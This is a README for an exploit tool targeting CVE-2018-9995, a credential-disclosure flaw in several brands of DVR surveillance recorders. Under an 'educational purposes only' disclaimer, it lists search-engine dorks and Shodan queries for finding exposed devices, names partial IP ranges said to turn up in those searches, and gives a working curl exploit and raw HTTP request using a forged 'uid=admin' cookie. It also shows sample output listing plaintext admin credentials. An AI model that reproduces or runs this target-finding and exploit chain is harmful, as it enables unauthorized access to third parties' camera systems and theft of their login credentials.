# DVR Credential Scanner

A simple educational tool to demonstrate the CVE-2018-9995 vulnerability in certain DVR (Digital Video Recorder) systems.

## ⚠️ Disclaimer

This tool is provided for **EDUCATIONAL PURPOSES ONLY**. The author and contributors are not responsible for any misuse or damage caused by this program. Using this tool against systems without explicit permission is illegal and may result in criminal charges.

## 📝 About the Vulnerability

- **CVE ID**: CVE-2018-9995
- **CVSS Base Score v3**: 7.3/10
- **CVSS Vector String**: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
- **Vulnerability Type**: Information Disclosure

The vulnerability allows unauthorized users to extract login credentials from vulnerable DVR systems by sending a specially crafted HTTP request.

## 🎯 Affected Devices

The following DVR brands/models may be vulnerable:
- Novo
- CeNova
- QSee
- Pulnix
- XVR 5-in-1
- Securus
- Night OWL
- Various DVRs with "DVR Login", "HVR Login", or "MDVR Login" banners

## 🔍 Finding DVR Systems for Testing

For educational and research purposes, you can identify potential DVR systems using specialized search techniques. Here are some methods security researchers use:

### Google Dorks

Google dorks are specialized search queries that can help find specific web interfaces. Here are some examples for finding DVR login pages:

```
intitle:"DVR LOGIN"
intitle:"DVR LOGIN" -com
intitle:"DVR Login" -com
intitle:"XVR Login" -com
intitle:"MDVR Login" -com
intitle:"HVR Login" -com
```

Common IP addresses found in these searches include:
- 91.201.122.x
- 59.26.65.x
- 47.113.219.x
- And many others

### Other Search Options

You can also use specialized search engines that index IoT devices:
- Shodan.io with queries like `title:"DVR LOGIN"`
- Censys.io
- ZoomEye

### Important Note

**Always ensure you have explicit permission to test any system you identify.** Only test on systems you own or have written permission to test. Unauthorized access is illegal and unethical.

## 📋 Requirements

- Python 3.6 or higher
- Internet connection

## 🔧 Installation

1. Clone this repository:
   ```
   git clone https://github.com/its-anya/DVR_Credential_Scanner.git
   ```

2. Change to the project directory:
   ```
   cd DVR_Credential_Scanner
   ```

3. Install the required dependencies:
   ```
   pip install -r requirements.txt
   ```

## 🚀 Usage

### Interactive Mode (Recommended)

Simply run the script without any arguments, and it will prompt you for the target information:
```
python dvr_scanner.py
```

You will be prompted to enter:
- The target host (IP address or hostname)
- The target port (defaults to 80 if not specified)

After scanning one target, you'll be asked if you want to scan another.

### Command-line Mode

You can also use command-line arguments:
```
python dvr_scanner.py --host [TARGET_IP] --port [TARGET_PORT]
```

Example:
```
python dvr_scanner.py --host 192.168.1.100 --port 80
```

### Command-line Arguments

- `--host`: Target IP address or hostname (will prompt if not provided)
- `--port`: Target port number (default: 80)
- `--timeout`: Connection timeout in seconds (default: 10)

### Manual Exploitation

You can also manually validate the vulnerability using curl:

```bash
curl "http://<dvr_host>:<port>/device.rsp?opt=user&cmd=list" -H "Cookie: uid=admin"
```

A successful exploitation will return a JSON response containing user credentials:

```json
{
  "result": 0,
  "list": [
    {
      "uid": "admin",
      "pwd": "Op1234567#",
      "role": 2,
      "enmac": 0,
      "mac": "00:00:00:00:00:00",
      "playback": 4294967295,
      "view": 4294967295,
      "rview": 4294967295,
      "ptz": 4294967295,
      "backup": 4294967295,
      "opt": 4294967295
    }
  ]
}
```

If you receive a different response or an error, the system may not be vulnerable to this exploit.

### Example Output

```
  ____  __     __  _____     _____                            
 |  _ \ \ \   / / |  __ \   / ____|                           
 | | | | \ \_/ /  | |__) | | (___   ___ __ _ _ __  _ __   ___ _ __ 
 | | | |  \   /   |  _  /   \___ \ / __/ _` | '_ \| '_ \ / _ \ '__|
 | |_| |   | |    | | \ \   ____) | (_| (_| | | | | | | |  __/ |   
 |____/    |_|    |_|  \_\ |_____/ \___\__,_|_| |_|_| |_|\\___|_|   
                                                        
 [*] CVE-2018-9995 | DVR Credential Scanner
 [*] Educational purposes only

 [*] Connecting to 192.168.1.100:80...

 [+] DVR URL:		192.168.1.100:80
 [+] Total Users:	1

╭──────────────────────┬──────────────────────┬──────────────────────╮
│             Username │             Password │              Role ID │
├──────────────────────┼──────────────────────┼──────────────────────┤
│                admin │           password12 │                    1 │
╰──────────────────────┴──────────────────────┴──────────────────────╯
```

## 🔍 Understanding the Vulnerability

The vulnerability exists because the DVR systems accept a cookie with `uid=admin` without proper authentication, and then return sensitive information including login credentials in a JSON response.

The exploit makes a simple HTTP request:
```
GET /device.rsp?opt=user&cmd=list HTTP/1.1
Host: [DVR_HOST]
Cookie: uid=admin
```

## 📜 License

This project is licensed under the MIT License. 
